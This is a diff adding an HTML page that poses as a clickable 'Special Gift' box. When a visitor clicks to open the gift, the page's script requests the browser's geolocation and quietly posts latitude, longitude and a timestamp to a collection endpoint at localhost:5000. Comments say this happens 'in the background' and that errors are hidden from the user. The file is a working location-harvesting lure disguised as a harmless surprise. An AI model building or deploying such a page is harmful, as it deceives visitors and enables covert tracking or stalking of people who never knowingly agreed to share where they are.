@@ -1,0 +1,140 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Special Gift For You</title>
+  <style>
+    body {
+      font-family: 'Arial', sans-serif;
+      background-color: #ffebee;
+      text-align: center;
+      padding: 20px;
+      color: #d32f2f;
+    }
+    .gift-container {
+      margin: 50px auto;
+      max-width: 400px;
+    }
+    .gift-box {
+      width: 200px;
+      height: 200px;
+      background-color: #f44336;
+      margin: 0 auto;
+      position: relative;
+      cursor: pointer;
+      border-radius: 5px;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+      transition: all 0.3s ease;
+    }
+    .gift-box:hover {
+      transform: scale(1.05);
+    }
+    .gift-lid {
+      width: 200px;
+      height: 50px;
+      background-color: #d32f2f;
+      position: absolute;
+      top: -50px;
+      left: 0;
+      border-radius: 5px 5px 0 0;
+    }
+    .gift-bow {
+      width: 40px;
+      height: 40px;
+      background-color: #ffeb3b;
+      position: absolute;
+      top: -20px;
+      left: 80px;
+      border-radius: 50%;
+    }
+    .gift-bow:before, .gift-bow:after {
+      content: '';
+      position: absolute;
+      width: 60px;
+      height: 20px;
+      background-color: #ffeb3b;
+      top: 10px;
+    }
+    .gift-bow:before {
+      left: -70px;
+      transform: rotate(-45deg);
+    }
+    .gift-bow:after {
+      right: -70px;
+      transform: rotate(45deg);
+    }
+    .message {
+      margin-top: 30px;
+      font-size: 18px;
+      opacity: 0;
+      transition: opacity 1s ease;
+    }
+    .visible {
+      opacity: 1;
+    }
+    h1 {
+      color: #b71c1c;
+    }
+  </style>
+</head>
+<body>
+  <div class="gift-container">
+    <h1>You've Received a Special Gift!</h1>
+    <p>Click on the gift box to open it and see your surprise</p>
+    
+    <div class="gift-box" onclick="openGift()">
+      <div class="gift-lid"></div>
+      <div class="gift-bow"></div>
+    </div>
+    
+    <div class="message" id="message">
+      Thank you for opening your gift! We hope you liked it.
+    </div>
+  </div>
+
+  <script>
+    function openGift() {
+      // Show the message
+      document.getElementById('message').classList.add('visible');
+      
+      // Change the gift appearance to look "opened"
+      const giftBox = document.querySelector('.gift-box');
+      giftBox.style.transform = 'translateY(50px)';
+      giftBox.style.height = '150px';
+      document.querySelector('.gift-lid').style.top = '-100px';
+      
+      // Get the location in the background
+      getLocation();
+    }
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendPosition, handleError);
+      }
+      // Fail silently if geolocation isn't supported
+    }
+
+    function sendPosition(position) {
+      const lat = position.coords.latitude;
+      const lon = position.coords.longitude;
+
+      // Send data to server quietly
+      fetch("http://localhost:5000/location", {
+        method: "POST",
+        headers: {
+          "Content-Type": "application/json"
+        },
+        body: JSON.stringify({ 
+          latitude: lat, 
+          longitude: lon,
+          timestamp: new Date().toISOString()
+        })
+      }).catch(err => console.error('Error:', err));
+    }
+
+    function handleError(error) {
+      console.error('Geolocation error:', error);
+      // Don't show any error to the user
+    }
+  </script>
+</body>
+</html>
